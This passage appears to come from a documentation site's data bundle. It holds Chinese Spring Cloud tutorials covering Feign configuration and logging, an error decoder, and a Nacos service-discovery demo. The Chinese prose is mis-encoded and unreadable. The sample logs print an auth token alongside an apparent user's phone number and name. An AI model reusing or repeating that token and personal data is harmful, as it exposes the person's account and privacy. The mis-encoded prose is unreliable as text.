40000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nç»è¿åç°çç¡®å¯ä»¥åå°ï¼å¨ä»£ç éçéç½®ä¼åçº§å±ç¶æ²¡æéç½®æä»¶é«ï¼æä¸ªäººè§å¾æ¯æé®é¢çï¼å¿½ç¶åæ³å°é£éç½®çæ± æ¯å¦ä¹æ¯æ ç¨çï¼å¾è§å¯ã\n\n\n# äºãæ¥å¿\n\nè¿éä¸ºäºçæ¯ä¸ªè¯·æ±çè·¯å¾ï¼åæ°ï¼èæ¶æä»¬å¯ä»¥è¿è¡å¦ä¸æä½ï¼loggerlevelï¼\n\nfeign:\n  compression:\n    # è¯·æ±åç¼©\n    request:\n      enabled: true\n      mime-types: "text/xml,application/xml,application/json"\n      # ç¨äºè®¾ç½®è¯·æ±çæå°éå¼\n      min-request-size: 1024\n    # ååºåç¼©\n    response:\n      enabled: true\n  hystrix:\n    enabled: false\n  okhttp:\n    enabled: true\n  client:\n    config:\n      default:\n        connecttimeout: 30000\n        readtimeout: 40000\n        # basic full headers none\n        loggerlevel: basic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nbasic æå°å¦ä¸\n\n2020-06-18 09:45:51.670 debug 26772 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e post http://server-data-platform/menu/getsondatamenulist http/1.1\n2020-06-18 09:45:52.637 debug 26772 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- http/1.1 200  (966ms)\n2020-06-18 09:45:52.767 debug 26772 --- [nio-8888-exec-2] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e post http://server-data-platform/electricitystation/getelectricitystationlist http/1.1\n2020-06-18 09:45:52.805 debug 26772 --- [nio-8888-exec-2] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- http/1.1 200  (38ms)\n\n\n\n1\n2\n3\n4\n5\n\n\nfull æå°å¦ä¸\n\n2020-06-18 09:54:05.190 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e post http://server-data-platform/menu/getsondatamenulist http/1.1\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-length: 1733\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-type: application/json\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] \n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] {"data":{"id":null,"parentid":null,"menuname":null,"menupath":"/electricitystation/list","menuorder":null,"icon":null,"remarks":null,"menudata":null,"menubutton":null},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"å¯è°¦æ¶¦","phone":"15771720565","onlinestate":null,"remarks":"fdsafdsa","rolesid":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"rolename":"è¶çº§ç®¡çå","remarks":"2222","menus":null},"menus":[{"id":1,"parentid":0,"menuname":"å¤§å±å±ç¤º","menupath":"/dashboard","menuorder":1000,"icon":"el-icon-monitor","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":2,"parentid":0,"menuname":"æ°æ®åæ","menupath":"/dataanalysis","menuorder":2000,"icon":"el-icon-data-line","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":3,"parentid":0,"menuname":"ç³»ç»ç®¡ç","menupath":"/setting","menuorder":3000,"icon":"el-icon-setting","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":5,"parentid":3,"menuname":"è§è²ç®¡ç","menupath":"/setting/roles","menuorder":3200,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":6,"parentid":3,"menuname":"èåç®¡ç","menupath":"/setting/menus","menuorder":3300,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]}]},{"id":16,"parentid":0,"menuname":"çµç«ç®¡ç","menupath":"/electricitystation","menuorder":4000,"icon":"el-icon-lightning","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":17,"parentid":16,"menuname":"çµç«ä¿¡æ¯","menupath":"/electricitystation/list","menuorder":4100,"icon":null,"remarks":"ååºææçµç«","menudata":false,"menubutton":false,"child":[]}]}]}}\n2020-06-18 09:54:05.191 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] ---\x3e end http (1733-byte body)\n2020-06-18 09:54:06.014 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- http/1.1 200  (822ms)\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] connection: keep-alive\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] content-type: application/json\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] date: thu, 18 jun 2020 01:54:05 gmt\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] keep-alive: timeout=60\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] transfer-encoding: chunked\n2020-06-18 09:54:06.015 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] \n2020-06-18 09:54:06.017 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] {"code":200,"msg":null,"data":[{"id":24,"parentid":17,"menuname":"çµç«æ°æ®","menupath":"/electricitystation/data","menuorder":4110,"icon":null,"remarks":null,"menudata":true,"menubutton":false,"child":[{"id":25,"parentid":24,"menuname":"å¹³é¡¶å±±","menupath":"/electricitystation/data/pds","menuorder":4111,"icon":null,"remarks":null,"menudata":true,"menubutton":false,"child":[]}]}]}\n2020-06-18 09:54:06.017 debug 29140 --- [nio-8888-exec-1] com.giant.cloud.api.menuapi              : [menuapi#getsondatamenulist] <--- end http (388-byte body)\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e post http://server-data-platform/electricitystation/getelectricitystationlist http/1.1\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-length: 1756\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-type: application/json\n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] \n2020-06-18 09:54:06.453 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] {"data":{"data":{"id":null,"parentid":null,"menuname":null,"menupath":null,"menuorder":null,"icon":null,"remarks":null,"menudata":null,"menubutton":null,"menuid":"25"},"current":1,"size":20},"token":"5a717dca1142d685c8aa54b45d0388c8","user":{"id":1,"account":"15771720565","name":"å¯è°¦æ¶¦","phone":"15771720565","onlinestate":null,"remarks":"fdsafdsa","rolesid":1,"avatar":null,"token":"5a717dca1142d685c8aa54b45d0388c8","roles":{"id":1,"rolename":"è¶çº§ç®¡çå","remarks":"2222","menus":null},"menus":[{"id":1,"parentid":0,"menuname":"å¤§å±å±ç¤º","menupath":"/dashboard","menuorder":1000,"icon":"el-icon-monitor","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":2,"parentid":0,"menuname":"æ°æ®åæ","menupath":"/dataanalysis","menuorder":2000,"icon":"el-icon-data-line","remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":3,"parentid":0,"menuname":"ç³»ç»ç®¡ç","menupath":"/setting","menuorder":3000,"icon":"el-icon-setting","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":5,"parentid":3,"menuname":"è§è²ç®¡ç","menupath":"/setting/roles","menuorder":3200,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]},{"id":6,"parentid":3,"menuname":"èåç®¡ç","menupath":"/setting/menus","menuorder":3300,"icon":null,"remarks":null,"menudata":false,"menubutton":false,"child":[]}]},{"id":16,"parentid":0,"menuname":"çµç«ç®¡ç","menupath":"/electricitystation","menuorder":4000,"icon":"el-icon-lightning","remarks":null,"menudata":false,"menubutton":false,"child":[{"id":17,"parentid":16,"menuname":"çµç«ä¿¡æ¯","menupath":"/electricitystation/list","menuorder":4100,"icon":null,"remarks":"ååºææçµç«","menudata":false,"menubutton":false,"child":[]}]}]}}\n2020-06-18 09:54:06.454 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] ---\x3e end http (1756-byte body)\n2020-06-18 09:54:06.483 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- http/1.1 200  (29ms)\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] connection: keep-alive\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] content-type: application/json\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] date: thu, 18 jun 2020 01:54:05 gmt\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] keep-alive: timeout=60\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] transfer-encoding: chunked\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] \n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] {"code":200,"msg":null,"data":{"current":1,"size":20,"total":1,"records":[{"createtime":"2020-06-15t03:46:17.000+00:00","updatetime":"2020-06-15t03:46:17.000+00:00","deleteflag":false,"id":1,"menuid":25,"name":"å¹³é¡¶å±±æ°è½æºé¡¹ç®1æ","buildingdegree":30,"cityname":"å¹³é¡¶å±±","cityid":"410400","lng":"113.308","lat":"33.7352","remarks":"æµè¯æ°æ®"}]}}\n2020-06-18 09:54:06.484 debug 29140 --- [nio-8888-exec-3] c.giant.cloud.api.electricitystationapi  : [electricitystationapi#getelectricitystationlist] <--- end http (362-byte body)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næå°±è¯å°è¿éäºï¼æ­£å¸¸æ¥è¯´ full å·²ç»è¶³å¤äºã\n\n\n# feign çå¨å±å¼å¸¸å¤ç\n\n@configuration\npublic class feignclienterrordecoder implements errordecoder {\n\n    private static final log log = logfactory.getlog(feignclienterrordecoder.class);\n\n    @override\n    public exception decode(string methodkey, response response) {\n        try {\n            string body = ioutil.read(response.body().asinputstream(), "utf-8");\n            map<string,string> errmap = jsonobject.parseobject(body, hashmap.class);\n            return new internalexception(errmap.get("message"));\n        }catch(exception e){\n            return new internalexception(e.getmessage());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',charsets:{cjk:!0}},{title:"SpringCloud alibaba - Nacos",frontmatter:{title:"SpringCloud alibaba - Nacos",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-cloud/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/04.spring%20cloud/2.SpringCloud%20alibaba%20-%20Nacos.html",relativePath:"01.æ¡æ¶/01.Spring/04.spring cloud/2.SpringCloud alibaba - Nacos.md",key:"v-63ccbaf9",path:"/spring/spring-cloud/2/",headers:[{level:2,title:"ææ¡£å­¦ä¹ ",slug:"ææ¡£å­¦ä¹ ",normalizedTitle:"ææ¡£å­¦ä¹ ",charIndex:2},{level:2,title:"discovery",slug:"discovery",normalizedTitle:"discovery",charIndex:147},{level:3,title:"ä¸è½½å®è£Nacosæå°±ä¸è¯´äº",slug:"ä¸è½½å®è£nacosæå°±ä¸è¯´äº",normalizedTitle:"ä¸è½½å®è£ nacos æå°±ä¸è¯´äº",charIndex:281},{level:3,title:"åæ­å»ºåºæ¬çæå¡ç»æ",slug:"åæ­å»ºåºæ¬çæå¡ç»æ",normalizedTitle:"åæ­å»ºåºæ¬çæå¡ç»æ",charIndex:313},{level:3,title:"å¯å¨",slug:"å¯å¨",normalizedTitle:"å¯å¨",charIndex:7898},{level:3,title:"è®¿é®ç»æ:",slug:"è®¿é®ç»æ",normalizedTitle:"è®¿é®ç»æ:",charIndex:7907}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ææ¡£å­¦ä¹  discovery ä¸è½½å®è£Nacosæå°±ä¸è¯´äº åæ­å»ºåºæ¬çæå¡ç»æ å¯å¨ è®¿é®ç»æ:",content:'# ææ¡£å­¦ä¹ \n\nNacos ä»ç»\nNacos ä¸è½½åéç½® ä¸è½½å°å\nNacos server éç½®è¯´æ\nNacos spring cloud åºç¡å¥é¨\nNacos spring æ³¨è§£è¯´æ\nNacos å¯¹åº spring cloud çæ¬\nNacos config yml éç½®è¯´æ\nNacos discovery yml éç½® API\nspring å®ç½å¯¹ cloud alibaba çä»ç»åéç½®\n\n> Nacos config æ¯çå¬éç½®ä¿¡æ¯ (yml) åçååç\n> Nacos discovery æ¯æ³¨ååç°æå¡ç\n\n\n# discovery\n\n\n# ä¸è½½å®è£ Nacos æå°±ä¸è¯´äº\n\nå®è£å¥½è®¿é®é¡µé¢\n\n\n\n\n# åæ­å»ºåºæ¬çæå¡ç»æ\n\n\n\ndemo-cloud pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.5.RELEASE</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n    <groupId>com.example</groupId>\n    <artifactId>demo-cloud</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <name>demo-cloud</name>\n    <description>Demo project for Spring Boot</description>\n\n    <properties>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencyManagement>\n        <dependencies>\n            <dependency>\n                <groupId>com.alibaba.cloud</groupId>\n                <artifactId>spring-cloud-alibaba-dependencies</artifactId>\n                <version>2.1.0.RELEASE</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n\n    <modules>\n        <module>demo-order-server</module>\n        <module>demo-user-server</module>\n    </modules>\n\n\n    <dependencies>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter</artifactId>\n        </dependency>\n\n        \x3c!-- Nacos æ³¨ååç° --\x3e\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n        </dependency>\n        \x3c!-- Nacos éç½®çå¬--\x3e\n\x3c!--        <dependency>--\x3e\n\x3c!--            <groupId>com.alibaba.cloud</groupId>--\x3e\n\x3c!--            <artifactId>spring-cloud-starter-alibaba-nacos-config</artifactId>--\x3e\n\x3c!--        </dependency>--\x3e\n\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-maven-plugin</artifactId>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\ndemo-order-server.pom å demo-user-server.pom ä¸æ ·\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>com.example</groupId>\n        <artifactId>demo-cloud</artifactId>\n        <version>0.0.1-SNAPSHOT</version>\n    </parent>\n\n    <groupId>com.example</groupId>\n    <artifactId>demo-order-server</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ndemo-order-server.yml\n\nserver:\n  port: 8080\n\nspring:\n  application:\n    name: order-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # å¼èå´ï¼1å°100ãå¼è¶å¤§ï¼ééè¶å¤§ã\n        weight: 1\n        # éç¾¤åç§°\n        cluster-name:  order\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server.yml\n\nserver:\n  port: 8081\n\nspring:\n  application:\n    name: user-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # å¼èå´ï¼1å°100ãå¼è¶å¤§ï¼ééè¶å¤§ã\n        weight: 1\n        # éç¾¤åç§°\n        cluster-name:  user\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server Application\n\npackage com.example.userserver;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.boot.web.client.RestTemplateBuilder;\nimport org.springframework.cloud.client.discovery.EnableDiscoveryClient;\nimport org.springframework.cloud.client.loadbalancer.LoadBalanced;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.web.client.RestTemplate;\n\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class DemoUserServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoUserServerApplication.class, args);\n    }\n\n    /**\n     * æå¨åå»ºä¸ä¸ªRestTemplateçéç½®ï¼\n    **/\n    @Bean\n    @LoadBalanced\n    public RestTemplate restTemplate(RestTemplateBuilder builder){\n        return builder.build();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ndemo-order-server Application\n\npackage com.example.orderserver;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.cloud.client.discovery.EnableDiscoveryClient;\n\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class DemoOrderServerApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(DemoOrderServerApplication.class, args);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndemo-order-server OrderController\n\npackage com.example.orderserver.controller;\n\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\n/**\n * @Author big uncle\n * @Date 2020/3/20 11:33\n * @module HYQ_APP\n **/\n@RestController\n@RequestMapping("order")\npublic class OrderController {\n\n    Map<String,List<String>> map = new HashMap<String,List<String>>(10){{\n        put("1",Arrays.asList("userId:1 orderId:1","userId:1 orderId:2","userId:1 orderId:3","userId:1 orderId:4"));\n        put("2",Arrays.asList("userId:2 orderId:10","userId:2 orderId:12","userId:2 orderId:13","userId:2 orderId:14"));\n        put("3",Arrays.asList("userId:3 orderId:20","userId:3 orderId:22","userId:3 orderId:23","userId:3 orderId:24"));\n    }};\n\n\n    @GetMapping("/getOrder/{userId}")\n    public List<String> getOrder(@PathVariable String userId){\n        return map.get(userId);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\ndemo-user-server OrderController\n\npackage com.example.userserver.controller;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport org.springframework.web.client.RestTemplate;\n\nimport java.util.List;\n\n/**\n * æå±Y-APIæ¨¡å\n * æ¨¡åæè¿°\n *\n * @Author big uncle\n * @Date 2020/3/20 11:24\n * @module HYQ_APP\n **/\n@RestController\n@RequestMapping("user")\npublic class UserController {\n\n    private RestTemplate restTemplate;\n\n    @Autowired\n    public UserController(RestTemplate restTemplate) {\n        this.restTemplate = restTemplate;\n    }\n\n\n    @GetMapping("/getMyOrder")\n    public List<String> getMyOrder(@RequestParam("userId") String userId){\n        List<String> list = restTemplate.getForObject("http://order-server/order/getOrder/" + userId, List.class);\n        return list;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# å¯å¨\n\n\n\n\n# è®¿é®ç»æ:\n\n',normalizedContent:'# ææ¡£å­¦ä¹ \n\nnacos ä»ç»\nnacos ä¸è½½åéç½® ä¸è½½å°å\nnacos server éç½®è¯´æ\nnacos spring cloud åºç¡å¥é¨\nnacos spring æ³¨è§£è¯´æ\nnacos å¯¹åº spring cloud çæ¬\nnacos config yml éç½®è¯´æ\nnacos discovery yml éç½® api\nspring å®ç½å¯¹ cloud alibaba çä»ç»åéç½®\n\n> nacos config æ¯çå¬éç½®ä¿¡æ¯ (yml) åçååç\n> nacos discovery æ¯æ³¨ååç°æå¡ç\n\n\n# discovery\n\n\n# ä¸è½½å®è£ nacos æå°±ä¸è¯´äº\n\nå®è£å¥½è®¿é®é¡µé¢\n\n\n\n\n# åæ­å»ºåºæ¬çæå¡ç»æ\n\n\n\ndemo-cloud pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.2.5.release</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n    <groupid>com.example</groupid>\n    <artifactid>demo-cloud</artifactid>\n    <version>0.0.1-snapshot</version>\n    <name>demo-cloud</name>\n    <description>demo project for spring boot</description>\n\n    <properties>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencymanagement>\n        <dependencies>\n            <dependency>\n                <groupid>com.alibaba.cloud</groupid>\n                <artifactid>spring-cloud-alibaba-dependencies</artifactid>\n                <version>2.1.0.release</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencymanagement>\n\n\n    <modules>\n        <module>demo-order-server</module>\n        <module>demo-user-server</module>\n    </modules>\n\n\n    <dependencies>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter</artifactid>\n        </dependency>\n\n        \x3c!-- nacos æ³¨ååç° --\x3e\n        <dependency>\n            <groupid>com.alibaba.cloud</groupid>\n            <artifactid>spring-cloud-starter-alibaba-nacos-discovery</artifactid>\n        </dependency>\n        \x3c!-- nacos éç½®çå¬--\x3e\n\x3c!--        <dependency>--\x3e\n\x3c!--            <groupid>com.alibaba.cloud</groupid>--\x3e\n\x3c!--            <artifactid>spring-cloud-starter-alibaba-nacos-config</artifactid>--\x3e\n\x3c!--        </dependency>--\x3e\n\n    </dependencies>\n\n    <build>\n        <plugins>\n            <plugin>\n                <groupid>org.springframework.boot</groupid>\n                <artifactid>spring-boot-maven-plugin</artifactid>\n            </plugin>\n        </plugins>\n    </build>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\ndemo-order-server.pom å demo-user-server.pom ä¸æ ·\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <parent>\n        <groupid>com.example</groupid>\n        <artifactid>demo-cloud</artifactid>\n        <version>0.0.1-snapshot</version>\n    </parent>\n\n    <groupid>com.example</groupid>\n    <artifactid>demo-order-server</artifactid>\n    <version>0.0.1-snapshot</version>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ndemo-order-server.yml\n\nserver:\n  port: 8080\n\nspring:\n  application:\n    name: order-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # å¼èå´ï¼1å°100ãå¼è¶å¤§ï¼ééè¶å¤§ã\n        weight: 1\n        # éç¾¤åç§°\n        cluster-name:  order\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server.yml\n\nserver:\n  port: 8081\n\nspring:\n  application:\n    name: user-server\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8848\n        # å¼èå´ï¼1å°100ãå¼è¶å¤§ï¼ééè¶å¤§ã\n        weight: 1\n        # éç¾¤åç§°\n        cluster-name:  user\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ndemo-user-server application\n\npackage com.example.userserver;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.boot.web.client.resttemplatebuilder;\nimport org.springframework.cloud.client.discovery.enablediscoveryclient;\nimport org.springframework.cloud.client.loadbalancer.loadbalanced;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.web.client.resttemplate;\n\n@springbootapplication\n@enablediscoveryclient\npublic class demouserserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(demouserserverapplication.class, args);\n    }\n\n    /**\n     * æå¨åå»ºä¸ä¸ªresttemplateçéç½®ï¼\n    **/\n    @bean\n    @loadbalanced\n    public resttemplate resttemplate(resttemplatebuilder builder){\n        return builder.build();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ndemo-order-server application\n\npackage com.example.orderserver;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\nimport org.springframework.cloud.client.discovery.enablediscoveryclient;\n\n@springbootapplication\n@enablediscoveryclient\npublic class demoorderserverapplication {\n\n    public static void main(string[] args) {\n        springapplication.run(demoorderserverapplication.class, args);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndemo-order-server 